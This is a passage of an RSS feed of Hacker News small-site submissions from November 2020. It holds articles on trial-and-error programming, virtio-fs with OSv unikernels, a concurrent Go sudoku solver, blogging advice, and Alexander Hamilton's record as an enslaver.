<p><span>A short while later, when trying to debug his code myself, I realized that he actually had a typo in his test-input. Turns out his code was right all along. But by focusing all his efforts on fixing a non-existent bug, instead of trying to understand the real cause of the error, he ended up getting further and further away from the solution with each step.</span></p>



<p><span>If you’re somebody with no aptitude whatsoever for analyzing systems, the evolutionary approach might be your best remaining option. But if your intellectual capacity is indeed lacking so significantly, you really should reconsider your career choice. A different profession, such as politics, might be more up your alley. Maybe one day, someone will build an AI that is capable of developing software using an evolutionary approach. Such a system may actually be successful, because computers can be massively scaled out and parallelized. Unfortunately, the same cannot be said of your labor.</span></p>



<p><span>The next time you hit a problem, don’t just make random changes until something somehow starts working. Such an approach may work in the ultra-short-term, but it’s only going to produce spaghetti code that no one else will be able to understand, reuse or improve upon. You’re not a force of nature, nor are you a robot. Leave evolution to the science textbooks and start practicing some intelligent design.</span></p>



<hr>



<p><em><span>Discussion on </span><a rel="noopener" href="https://www.reddit.com/r/coding/comments/471ua3/dont_be_an_evolutionary_programmer/" target="_blank">/r/coding</a><br><span>Discussion on </span><a rel="noopener" href="https://www.reddit.com/r/programming/comments/471txe/dont_be_an_evolutionary_programmer/" target="_blank">/r/programming</a><br><a rel="noopener" href="http://www.thecaucus.net/#/content/caucus/tech_blog/359" target="_blank">Original post</a> from 2016</em></p>
	</div><div>
				<p><strong>Published</strong>
			<time datetime="2018-04-29T19:40:25+00:00">2018-04-29</time><time datetime="2019-09-10T12:43:47+00:00">2019-09-10</time>		</p><!-- .site-posted-on -->
	</div></div>]]>
            </description>
            <link>https://software.rajivprab.com/2018/04/29/dont-be-an-evolutionary-programmer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077333</guid>
            <pubDate>Fri, 13 Nov 2020 00:36:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Virtio-FS on a Unikernel]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077279">thread link</a>) | @eyberg
<br/>
November 12, 2020 | https://www.qemu.org/2020/11/03/osv-virtio-fs/ | <a href="https://web.archive.org/web/*/https://www.qemu.org/2020/11/03/osv-virtio-fs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
		<div>
			<!-- Main -->
	<section>
		<header>
			
			<p>03 Nov 2020 — by Fotis Xenakis</p>
		</header>
		<p>This article provides an overview of <a href="https://virtio-fs.gitlab.io/">virtio-fs</a>,
a novel way for sharing the host file system with guests and
<a href="https://github.com/cloudius-systems/osv">OSv</a>, a specialized, lightweight
operating system (unikernel) for the cloud, as well as how these two fit
together.</p>

<h2 id="virtio-fs">virtio-fs</h2>

<p>Virtio-fs is a new host-guest shared filesystem, purpose-built for local file
system semantics and performance. To that end, it takes full advantage of the
host’s and the guest’s colocation on the same physical machine, unlike
network-based efforts, like virtio-9p.</p>

<p>As the name suggests, virtio-fs builds on virtio for providing an efficient
transport: it is included in the (currently draft, to become v1.2) virtio
<a href="https://github.com/oasis-tcs/virtio-spec">specification</a> as a new device. The
protocol used by the device is a slightly extended version of
<a href="https://github.com/libfuse/libfuse">FUSE</a>, providing a solid foundation for
all file system operations native on Linux. Implementation-wise, on the QEMU
side, it takes the approach of splitting between the guest interface (handled
by QEMU) and the host file system interface (the device “backend”). The latter
is handled by virtiofsd (“virtio-fs daemon”), running as a separate process,
utilizing the
<a href="https://www.qemu.org/docs/master/interop/vhost-user.html">vhost-user</a> protocol
to communicate with QEMU.</p>

<p>One prominent performance feature of virtio-fs is the DAX (Direct Access)
window. It’s a shared memory window between the host and the guest, exposed as
device memory (a PCI BAR) to the second. Upon request, the host (QEMU) maps file contents to the window for the guest to access directly. This bears performance
gains due to taking VMEXITs out of the read/write data path and bypassing the
guest page cache on Linux, while not counting against the VM’s memory (since
it’s just device memory, managed on the host).</p>

<p><img src="https://gitlab.com/virtio-fs/virtio-fs.gitlab.io/-/raw/master/architecture.svg" alt="virtio-fs DAX architecture"></p>

<p>Virtio-fs is under active development, with its community focussing on a pair of
device implementation in QEMU and device driver in Linux. Both components are
already available upstream in their initial iterations, while upstreaming
continues further e.g. with DAX window support.</p>

<h2 id="osv">OSv</h2>

<p>OSv is a <a href="https://en.wikipedia.org/wiki/Unikernel">unikernel</a> (framework). The
two defining characteristics of a unikernel are:</p>

<ul>
  <li><strong>Application-specialized</strong>: a unikernel is an executable machine image,
consisting of an application and supporting code (drivers, memory management,
runtime etc.) linked together, running in a single address space (typically
in guest “kernel mode”).</li>
  <li><strong>Library OS</strong>: each unikernel only contains the functionality mandated by its
application in terms of non-application code, i.e. no unused drivers, or even
whole subsystems (e.g. networking, if the application doesn’t use the
network).</li>
</ul>

<p>OSv in particular strives for binary compatibility with Linux, using a <a href="https://github.com/cloudius-systems/osv/wiki/Dynamic-Linker">dynamic
linker</a>. This means
that applications built for Linux should run as OSv unikernels without requiring
modifications or even rebuilding, at least most of the time. Of course, not the
whole Linux ABI is supported, with system calls like <code>fork()</code> and relatives
missing by design in all unikernels, which lack the notion of a process. Despite
this limitation, OSv is quite full featured, with full SMP support, virtual
memory, a virtual file system (and many filesystem implementations, including
ZFS) as well as a mature networking stack, based on the FreeBSD sources.</p>

<p>At this point, one is sure to wonder “Why bother with unikernels?”. The problem
they were originally
<a href="http://unikernel.org/files/2013-asplos-mirage.pdf">introduced</a> to solve is the
bloated software stack in modern cloud computing. Running general-purpose
operating systems as guests, typically for a single application/service, on top
of a hypervisor which already takes care of isolation and provides a standard
device model means duplication, as well as loss of efficiency. This is were
unikernels come in, trying to be just enough to support a single application
and as light-weight as possible, based on the assumption that they are executing
inside a VM. Below is an illustration of the comparison between
general-purpose OS, unikernels and containers (as another approach to the same
problem, for completeness).</p>

<p><img src="https://www.qemu.org/screenshots/2020-11-04-unikernel-vs-gpos.svg" alt="Unikernels vs GPOS vs containers"></p>

<h2 id="osv-meet-virtio-fs">OSv, meet virtio-fs</h2>

<p>As is apparent e.g. from the container world, it is very common for applications
running in isolated environments (such as containers, or unikernels even more
so) to require host file system access. Whereas containers sharing the host
kernel thus have an obvious, controlled path to the host file system, with
unikernels this has been more complex: all solutions were somewhat heavyweight,
requiring a network link or indirection through network protocols. Virtio-fs
then provided a significantly more attractive route: straight-forward mapping of
fs operations (via FUSE), reusing the existing virtio transport and decent
performance without high memory overhead.</p>

<p>The OSv community quickly identified the opportunity and came up with a
read-only implementation on its side, when executing under QEMU. This emphasized
being lightweight complexity-wise, while catering to many of its applications’
requirements (they are stateless, think e.g. serverless). Notably, it includes
support for the DAX window (even before that’s merged in upstream QEMU),
providing <a href="https://github.com/foxeng/diploma">excellent performance</a>, directly
rivalling that of its local (non-shared) counterparts such as ZFS and ROFS (an
OSv-specific read-only file system).</p>

<p>One central point is OSv’s support for booting from virtio-fs: this enables
deploying a modified version or a whole new application <strong>without rebuilding</strong>
the image, just by adjusting its root file system contents on the host. Last,
owing to the DAX window practically providing low-overhead access to the host’s
page cache, scalability is also expected to excel, with it being a common
concern due to the potentially high density of unikernels per host.</p>

<p>For example, to build the <code>cli</code> OSv image, bootable from virtio-fs, using the
core OSv <a href="https://github.com/cloudius-systems/osv#building-osv-kernel-and-creating-images">build
system</a>:</p>
<div><div><pre><code>scripts/build fs=virtiofs export=all image=cli
</code></pre></div></div>
<p>This results in a minimal image (just the initramfs), while the root fs contents
are placed in a directory on the host (<code>build/export</code> here, by default).</p>

<p><a href="https://github.com/cloudius-systems/osv#running-osv">Running</a> the above image
is just a step away (may want to use the virtio-fs development version of
<a href="https://gitlab.com/virtio-fs/qemu/-/tree/virtio-fs-dev">QEMU</a>, e.g. for DAX
window support):</p>
<div><div><pre><code>scripts/run.py --virtio-fs-tag=myfs --virtio-fs-dir=$(pwd)/build/export
</code></pre></div></div>
<p>This orchestrates running both virtiofsd and QEMU, using the contents of
<code>build/export</code> as the root file system. Any changes to this directory, directly
from the host will be visible in the guest without re-running the previous build
step.</p>

<h2 id="conclusion">Conclusion</h2>

<p>OSv has gained a prominent new feature, powered by virtio-fs and its QEMU
implementation. This allows efficient, lightweight and performant access to the
host’s file system, thanks to the native virtio transport, usage of the FUSE
protocol and the DAX window architecture. In turn, it enables use cases like
rapid unikernel reconfiguration.</p>

		<ul>
		
		<li><span></span><a href="https://www.qemu.org/blog/category/storage/index.html">storage</a></li>
		
		<li><span></span><a href="https://www.qemu.org/blog/category/virtio-fs/index.html">virtio-fs</a></li>
		
		<li><span></span><a href="https://www.qemu.org/blog/category/unikernel/index.html">unikernel</a></li>
		
		<li><span></span><a href="https://www.qemu.org/blog/category/osv/index.html">OSv</a></li>
		
		</ul>
	</section>

		</div>
	</div></div>]]>
            </description>
            <link>https://www.qemu.org/2020/11/03/osv-virtio-fs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077279</guid>
            <pubDate>Fri, 13 Nov 2020 00:32:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Go: A Concurrent Sudoku Solver with Channels]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25076752">thread link</a>) | @tosh
<br/>
November 12, 2020 | https://dkmccandless.github.io/2020/10/09/a-concurrent-sudoku-solver-with-channels.html | <a href="https://web.archive.org/web/*/https://dkmccandless.github.io/2020/10/09/a-concurrent-sudoku-solver-with-channels.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Logical deduction puzzles like sudoku can often be modeled as consisting of a large number of similar and independent deductive steps, making them amenable to concurrency-based implementations. <a href="https://github.com/dkmccandless/sudokami">Sudokami</a> is a concurrent sudoku solver written in Go, a sketch of some of my ideas along these lines. Here’s how it works.</p>

<h3 id="just-go-things">Just Go Things</h3>

<p>The unit of concurrency in Go is the <a href="https://tour.golang.org/concurrency/1">goroutine</a>, which is an independently executing function with its own call stack—somewhat akin to a thread, except that goroutines are managed directly by the Go runtime itself. They’re cheap too: Sudokami creates more than a thousand of them, which barely taxes the runtime’s capabilities.</p>

<p>Goroutines communicate with each other via <a href="https://tour.golang.org/concurrency/2">channels</a>, on which one goroutine can send a value to be received by another. Channels can optionally be declared with a buffer size. Unbuffered channels enforce synchronicity by blocking a receive operation <code>&lt;-ch</code> if no incoming send operation <code>ch &lt;- v</code> is ready. This is the basis of Go’s synchronization functionality. On the other hand, buffered channels will only block sends if the buffer is already full, in a manner similar to Erlang’s <a href="https://en.wikipedia.org/wiki/Message_queue">mailboxes</a>. The <code>select</code> statement provides a way to maintain synchronicity when using multiple channel operations concurrently, or a single channel if the <code>select</code> contains a <code>default</code> clause. With a single channel outside of a <code>select</code>, however, the question of whether to buffer reduces to a tradeoff of enabling synchronization vs. avoiding blocking.</p>

<p>The exception to this is that receives on a channel will never block if that channel has already been closed. Calling <code>close(ch)</code> will cause subsequent receives on <code>ch</code> to succeed immediately with the zero value of <code>ch</code>’s type (after the contents of its buffer, if any, have been depleted). Many concurrency idioms in Go rely on this helpful feature, but here too there is an important caveat: whereas a receive on a closed channel always succeeds, a send on a closed channel causes a run-time panic. Idioms based around closing a channel are therefore generally restricted to communication designs in which the channel has at most one goroutine sending on it. (The implementation below relies instead on a pattern of each channel having many senders but only one receiver, so <code>close</code> is never called.)</p>

<h3 id="the-logic-of-sudoku">The Logic of Sudoku</h3>

<p>Sudoku is a logical constraint puzzle in which a 9×9 grid of “cells” must be filled with the digits 1-9 such that each digit is unique in its row and column, and also in its 3×3 “box” subdivision of the grid. It is thus a type of <a href="https://en.wikipedia.org/wiki/Exact_cover">exact cover problem</a>.</p>

<p>But the basic structural unit of a sudoku puzzle is not the cell, and the basic logical unit is not the digit. A cell can be in nine possible states, exactly one of which is shown to be true in the unique solution of a well-formed puzzle. Sudoku aficionados often use the term “pencil mark” to describe each of a cell’s possible solution states. Below, they are called <em>candidate inferences</em> or candidates. A sudoku puzzle has 9<sup>3</sup> of them—one for each unique combination of row, column, and digit—and they are all boolean in nature: each one can be true or false. This subtle reformulation of a digit in the range [1, 9] as a collection of nine mutually exclusive boolean values allows the structural encoding of the logic underlying the puzzle to be refined and generalized.</p>

<p>A cell, then, can be described as the intersection of one row and one column, and it contains nine candidates, each corresponding to a digit. Extending the pencil mark analogy with erasing all but one possible digit to determine the state of a cell, we may consider the instances of a particular digit in a particular row. Here too, there are nine mutually exclusive possibilities, one for each column. Likewise for all instances of a particular digit across any row in a particular column. In a sense, a sudoku puzzle is a 9×9×9 cube of these boolean candidate inferences, and solving the puzzle is the act of determining which 81 of them are true.</p>

<p>Call a complete set of mutually exclusive candidates a <em>group</em>. “The 6s in the top row” is a group. “The 8s in the bottom right box” is too. So is “all of the digits in the 2nd column of the 5th row”. Here is a grid with a few (non-intersecting) groups highlighted:</p>

<p><img src="https://dkmccandless.github.io/assets/sudoku-grid-groups.png" alt=""></p>

<p>Each group contains exactly nine candidates, and each candidate belongs to four groups:</p>
<ol>
  <li>its cell</li>
  <li>the instances of its digit in its row</li>
  <li>the instances of its digit in its column</li>
  <li>the instances of its digit in its 3×3 box</li>
</ol>

<p>Given this definition, the logic of solving a sudoku puzzle can be fully described in terms of groups and their candidates, without any direct reference to locations within the grid, rows, columns, boxes, cells, or even digits.</p>

<p>(NB: The term “group” is often used in popular sudoku literature to describe any row, column, or box in general; under this usage, the “One Rule” is more succinctly stated as “Each digit appears once in each group”, but that might be its only advantage—in particular, it’s worth noting that each of these “groups” can be in 9! possible states. The definition above is more logically elemental and also more useful to code with, as it exposes the helpful abstraction that a cell is the same kind of constraint domain as, for example, a row-digit intersection.)</p>

<h3 id="data-structures">Data Structures</h3>

<p>How might these entities function in code? A Group object could watch its Candidates to figure out when one Candidate must be true, and then advise its other Candidates accordingly. Each Candidate might attempt to determine whether it was true, and then communicate that information to its Groups. (In view of the bipartite nature of exact cover problems, we would hope to design a communication protocol obviating the need for Candidates to communicate directly with each other.) To an extent, the Candidate and Group types would have symmetrical definitions: each would need to receive from a channel on which its counterparts would send, and be able to send on some channels from which each of its counterparts would receive. So the their definitions might look something like this:</p>

<div><div><pre><code><span>type</span> <span>Candidate</span> <span>struct</span> <span>{</span>
	<span>ch</span> <span>chan</span> <span>bool</span>
	<span>groups</span> <span>[]</span><span>chan</span> <span>bool</span>
	<span>value</span> <span>bool</span>
<span>}</span>
</code></pre></div></div>
<div><div><pre><code><span>type</span> <span>Group</span> <span>struct</span> <span>{</span>
	<span>ch</span> <span>chan</span> <span>bool</span>
	<span>cans</span> <span>[]</span><span>chan</span> <span>bool</span>
<span>}</span>
</code></pre></div></div>
<p>Locally, each Group would additionally need to keep track of the information it receives. In practice, however, the number of <code>false</code>s is sufficient, and since this number is only used within the scope of the Group’s goroutine, a separate field for it is not necessary. On the other hand, in order to display the finished solution, each Candidate must also remember its truth value.</p>

<p>A few design goals:</p>
<ul>
  <li>First and foremost, deadlock must be provably impossible in the process of solving a well-formed puzzle with a unique solution.</li>
  <li>In the spirit of logical simplicity, Candidates and Groups should carry minimal information about their location within the puzzle, so that their function can be as decentralized as possible. The necessary relationships are encoded in the set of channel references each possesses. Beyond this, the logical symmetry of the puzzle does not strictly require any positional information to be considered, as there are no “special” rows, columns, or digits.</li>
  <li>It would be nice to limit the number of values that would need to be sent. Specifically, is it ever necessary for a Candidate to send more than one value to each of its Groups? Can a Group function properly sending only one identical value to each of its Candidates?</li>
  <li>For the sake of readability and reasonability, it would also be nice to limit the number of channels involved. Will one per Candidate and one per Group work?</li>
</ul>

<p>It seems that an ideal design solution would have one channel for each Candidate and one for each Group, on which they listen for information sent by their counterparts. Each Candidate should send to each of its Groups exactly once in the course of the solution process, without needing to indicate its location in the puzzle. Each Group should send to each of its Candidates exactly once, without needing to know their location. Since a Group receives all of its Candidates’ information on a single channel, this last criterion necessitates that it send the same boolean value to all of its Candidates.</p>

<p>It turns out that there is a logically consistent and relatively simple way to do all of this.</p>

<h3 id="communication-protocol">Communication Protocol</h3>

<p>In designing the protocol by which Candidates and Groups interact, we make use of the fact that, in a properly formed sudoku puzzle with a unique solution, the truth value of a Candidate does not depend on the order of the deductions that imply its truth or falsity. For a hypothetical protocol in which each boolean value sent to a Candidate indicated that Candidate’s truth value, it would receive the same information from each of its Groups, in some order or other. Therefore, it would only be necessary for each Candidate to pay attention to the first value it received. The above constraint can be relaxed accordingly: a Group may only send a value to a Candidate if that value indicates whether the Candidate is true, <em>unless the Group knows that the Candidate has already received a value</em>. Specifically, it’s fine for a Group to send <code>false</code> to <em>all</em> of its Candidates after it has received a value of <code>true</code> from one of them, since it will receive <code>true</code> exactly once in a well-formed puzzle, and the Candidate that sent it already knows that it is true (because it received this information first from another source). On the other hand, a Group must not send <code>true</code> until it has received eight <code>false</code>s.</p>

<p>These conditions strongly suggest the use of buffered channels. While concurrency is one of Sudokami’s central design goals, there is no need for Groups and Candidates to actually synchronize with each other. On the other hand, since the number of values that will be sent on each channel is known in advance, buffering to this capacity ensures that sends will never block, even if not all of those values are consumed.</p>

<p>The protocol itself is …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dkmccandless.github.io/2020/10/09/a-concurrent-sudoku-solver-with-channels.html">https://dkmccandless.github.io/2020/10/09/a-concurrent-sudoku-solver-with-channels.html</a></em></p>]]>
            </description>
            <link>https://dkmccandless.github.io/2020/10/09/a-concurrent-sudoku-solver-with-channels.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25076752</guid>
            <pubDate>Thu, 12 Nov 2020 23:29:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lessons learned from blogging for 10 years]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25076727">thread link</a>) | @davefreiburger
<br/>
November 12, 2020 | https://gradually.co/why-blogging-is-better-than-any-audience-building-mechanism/ | <a href="https://web.archive.org/web/*/https://gradually.co/why-blogging-is-better-than-any-audience-building-mechanism/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
			<article id="post-922">
				<!-- <a href="https://gradually.co/why-blogging-is-better-than-any-audience-building-mechanism/">-->
					<div>
						<div>
	              			<!-- category colored coded display and hide takeaways php -->
	              																			<p>								Wisdom								</p><!-- end cat-wrap -->
						<p><span>&nbsp; •&nbsp; </span>
						<span>Why Blog</span>
						<span> &nbsp;•&nbsp; </span>
						<span>
							November 12, 2020						</span>

						<img width="640" height="287" src="https://gradually.co/wp-content/uploads/2020/11/GD26-Wisdom.gif" alt="" loading="lazy"></p><div>

																					<div>
								<p><a href="https://giphy.com/gifs/signal-blogging-personal-brand-yH7DhArkFamCfoNTik" target="_blank">
									[Image source: Giphy]								</a></p><h5>
									<a href="https://andrewchen.co/professional-blogging/" target="_blank">
										10 years of professional blogging – what I’ve learned									</a>
									 &nbsp;by Andrew Chen									<br>
								</h5>
								
								<p>
									Takeaways
								</p>
								<div>
									<ul>
<li><span>I keep seeing “bat signal” as a reference to sharing your aspirations, ideas, and interests online. Essentially the higher, brighter, and attracting your bat signal is, the more doors unlock for you. Blogging is one form of getting your bat signal going.</span></li>
<li><span>Andrew on blogging: “It’s awesome, but insanely hard to get started. Of course, everyone knows the mechanics of setting up a blog – but the hard part is finding your voice, figuring out topics that are interesting for other folks to read, and building a long-term habit.”</span></li>
<li><span>“Writing is the most scalable professional networking activity – stay home, don’t go to events/conferences, and just put ideas down” — Andrew Chen</span></li>
<li><span>Blog titles are one of the most important aspects of your blog, but should be created last. Your blog titles should be able to pass the naked share test. Meaning it should be able to stand as an opinion on its own.</span></li>
<li><span>“Thinking of yourself as a journalist that’s covering interesting ideas, trends, products, and everything that’s happening around you leads to much better/stronger content.” — Andrew Chen</span></li>
<li><span>“The important part is just to start giving out your knowledge and ideas – and over time, to build that into a platform for other activities.” — Andrew Chen</span></li>
<li><span>“Building your network, your audience, and your ideas will be something you’ll want to do over your entire career.” — Andrew Chen</span></li>
</ul>
								</div>
								<p><img src="https://gradually.co/wp-content/themes/gradually/img/two-cents.png">
								</p><!-- end half sqaure arrow -->
								<p><span>Andrew’s last point is the hardest hitting for me and it brings me back to the bat signal. Your bat signal strengthens throughout your career. As with all valuable things, your bat signal and career aren’t built overnight, only [gr_dua_y]…👣👣 </span></p>
								<p>
								<span>Share</span> (if you're an OG)  &nbsp;  <span></span><span><span>
									</span><span>


							</span></span></p></div><!-- end newsletter wrap content -->
													
						</div><!-- end newsletter wrap content -->
					</div><!-- end newsletter wrap -->
				<!-- </a>-->
			</div></article><!-- #post-## -->
		</div></div>]]>
            </description>
            <link>https://gradually.co/why-blogging-is-better-than-any-audience-building-mechanism/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25076727</guid>
            <pubDate>Thu, 12 Nov 2020 23:26:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Popular view of Alexander Hamilton as key U.S. slavery abolitionist falls short]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25076594">thread link</a>) | @AndrewBissell
<br/>
November 12, 2020 | https://www.cbc.ca/news/entertainment/alexander-hamilton-slavery-research-paper-1.5798143 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/entertainment/alexander-hamilton-slavery-research-paper-1.5798143">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Alexander Hamilton is almost universally depicted as an abolitionist in popular modern works, from Ron Chernow's 2004 biography, Hamilton, to Lin-Manuel Miranda's Tony Award-winning show, Hamilton: An American Musical. But after poring over ledgers and correspondence of Hamilton and his wife, a new research paper concluded that image falls short.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5798181.1605109529!/cpImage/httpImage/image.jpg_gen/derivatives/16x9_780/new-york-daily-life.jpg"></p></div><figcaption>A statue of Alexander Hamilton stands in New York's Central Park on Tuesday. Hamilton is almost universally depicted as an abolitionist in popular modern works, including Miranda's Tony Award-winning Hamilton musical. But after poring over ledgers and correspondence of Hamilton and his wife, Jessie Serfilippi concluded that image falls short.<!-- --> <!-- -->(Frank Franklin II/The Associated Press)</figcaption></figure><p><span><p>A new research paper takes a swipe at the popular image of Alexander Hamilton as the U.S. abolitionist founding father, citing evidence he was a slave trader and owner himself.</p>  <p>"Not only did Alexander Hamilton enslave people, but his involvement in the institution of slavery was essential to his identity, both personally and professionally," Jessie Serfilippi, an interpreter at a New York state historic site, wrote in a paper published last month.</p>  <p>Hamilton is almost universally depicted as an abolitionist in popular modern works, from Ron Chernow's 2004 biography, <em>Hamilton</em>,&nbsp;to Lin-Manuel Miranda's Tony Award-winning show, <em>Hamilton: An American Musical.</em></p>  <p>But after poring over ledgers and correspondence of Hamilton and his wife, Eliza Schuyler Hamilton, Serfilippi, who works at the Schuyler Mansion State Historic Site in Albany, N.Y., concluded that image falls short.</p>  <p>"It is vital that the myth of Hamilton as 'the Abolitionist Founding Father'&nbsp;end," Serfilippi writes in the paper&nbsp;entitled&nbsp;As Odious and Immoral a Thing: Alexander Hamilton's Hidden History as an Enslaver.&nbsp;Her research was published on the New York state park system website.</p>  <p>The paper adds to a concern voiced by many academics that the fictitious Hamilton of the musical, who attacks slavery in a rap battle with Thomas Jefferson, is just that: fictitious.</p>  <p>"Fascinating article," tweeted Harvard Law professor and historian Annette Gordon-Reed, who has criticized the Broadway show in the past. "Reminds of the ubiquitous nature of slavery in the colonial period and the early American republic. Alexander Hamilton as an enslaver broadens the discussion."</p>  <p>Chernow called the paper a "terrific research job that broadens our sense of Hamilton's involvement in slavery in a number of ways." But he questioned her claim that slavery was "essential to his identity" and said Serfilippi omitted information that would contradict her conclusions.</p>    <p>For example, Chernow noted Hamilton's work with the Manumission Society to abolish slavery in New York and defend free Blacks when slave masters from out of state tried to snatch them off New York streets.</p>  <p>"Had she tried to reconcile these important new findings with a full and fair statement of Hamilton's anti-slavery activities, we would have gotten a large and complex view of the man and her paper would have been far more persuasive," Chernow said via email.</p>  <p>Miranda declined to comment through his publicist. In past interviews, he's said he welcomes discussion of both Hamilton's role in slavery and criticism of his show's handling of that part of his life.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5450175.1605109224!/cpImage/httpImage/image.jpg_gen/derivatives/original_300/film-hamilton.jpg 300w,https://i.cbc.ca/1.5450175.1605109224!/cpImage/httpImage/image.jpg_gen/derivatives/original_460/film-hamilton.jpg 460w,https://i.cbc.ca/1.5450175.1605109224!/cpImage/httpImage/image.jpg_gen/derivatives/original_620/film-hamilton.jpg 620w,https://i.cbc.ca/1.5450175.1605109224!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/film-hamilton.jpg 780w,https://i.cbc.ca/1.5450175.1605109224!/cpImage/httpImage/image.jpg_gen/derivatives/original_1180/film-hamilton.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5450175.1605109224!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/film-hamilton.jpg"></p></div><figcaption>In this June 12, 2016, file photo, Lin-Manuel Miranda and the cast of Hamilton perform at the Tony Awards in New York.<!-- --> <!-- -->(Evan Agostini/Invision/AP)</figcaption></figure></span></p>  <h2>'Truth revealed in Hamilton's cash books and letters'</h2>  <p>When Hamilton married into the powerful Schuyler family in 1780, slavery was common among New York state's elite. More than 40 people were enslaved at the Schuyler family's Albany mansion and another estate over the years. The historic site has done extensive research into the family's so-called servants&nbsp;and incorporates it into its tours.</p>  <p>Albany Mayor Kathy Sheehan ordered the removal of the Maj. Gen. Philip Schuyler statue earlier this year in part because he was "reportedly the largest owner of enslaved people in Albany during his time," according to the mayor's office.</p>  <p>Serfilippi challenges the often repeated claim that Hamilton's exposure to the brutalities of slavery during his childhood on St. Croix instilled a hatred of slavery. She said&nbsp;"no primary sources have been found to corroborate" that.</p>  <p>Biographers have noted that Hamilton helped legal clients and family members buy and sell slaves, but they've been less clear on whether he enslaved people himself. Serfilippi said notations in his cash books and in family letters clearly show he did.</p>  <p>For example, Hamilton's cash books record a payment of $250 US to Philip Schuyler in 1796 for "2 Negro servants purchased by him for me." Another entry records receiving $100 US for lending a "Negro boy" to another person. And Serfilippi notes an inventory made of Hamilton's property to settle his affairs after his death in the duel with Aaron Burr in 1804 includes "servants" valued at 400 pounds.</p>  <p>Joanne Freeman, Yale history professor and editor of the Library of America edition of Hamilton's writings, said via email that, "It's fitting that we are reckoning with Hamilton's status as an enslaver at a time that is driving home how vital it is for white Americans to reckon — seriously reckon — with the structural legacies of slavery in America."</p>  <p>Serfilippi said her research interest goes beyond debunking myths about Hamilton.</p>  <p>"The truth revealed in Hamilton's cash books and letters must be acknowledged in order to honour the people he enslaved," she writes. "Through understanding and accepting Hamilton's status as an enslaver, the stories of the people he enslaved can finally take their rightful place in history."</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/entertainment/alexander-hamilton-slavery-research-paper-1.5798143</link>
            <guid isPermaLink="false">hacker-news-small-sites-25076594</guid>
            <pubDate>Thu, 12 Nov 2020 23:14:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Knowledge Economy: The Rise of Community-Curated Knowledge Networks]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25076142">thread link</a>) | @davefreiburger
<br/>
November 12, 2020 | https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/ | <a href="https://web.archive.org/web/*/https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
			<article id="post-920">
				<!--<a href="https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/">-->
					<div>
						<div>
	              			<!-- category colored coded display and hide takeaways php -->
	              											<p>																Wealth								</p><!-- end cat-wrap -->
						<p><span>&nbsp; •&nbsp; </span>
						<span>The Knowledge Economy</span>
						<span> &nbsp;•&nbsp; </span>
						<span>
							November 12, 2020						</span>

						<img width="640" height="337" src="https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-1024x539.png" alt="" loading="lazy" srcset="https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-1024x539.png 1024w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-300x158.png 300w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-768x404.png 768w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-1536x808.png 1536w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth.png 1900w" sizes="(max-width: 640px) 100vw, 640px"></p><div>

																					<div>
								<p><a href="https://sariazout.substack.com/p/check-your-pulse-55" target="_blank">
									[Image source: Check your Pulse #55 / Sari Azout]								</a></p><h5>
									<a href="https://sariazout.substack.com/p/check-your-pulse-55" target="_blank">
										The rise of community-curated knowledge networks									</a>
									 &nbsp;by Sari Azout / Check your Pulse									<br>
								</h5>
								
								<p>
									Takeaways
								</p>
								<div>
									<ul>
<li><span>This piece of content is all about the future of/how to think about online communities at the intersection of content curation and knowledge management&nbsp; 🤯 … *strap in*</span></li>
<li><span>“At least 2.5 quintillion bytes of information are produced every day, which is approximately what was produced during all of 2002. While this presents enormous opportunities, our brains are not equipped to deal with this abundance.” — Sari Azout</span></li>
<li><span>“We seem to have forgotten that the goal is not to consume more information. The goal is to think better, so we can achieve our goals.” — Sari Azout</span></li>
<li><span>“There’s a whole economy around knowledge organization available for the taking…&nbsp;</span>
<ul>
<li><span>Three intersecting problems remain unsolved:&nbsp;</span></li>
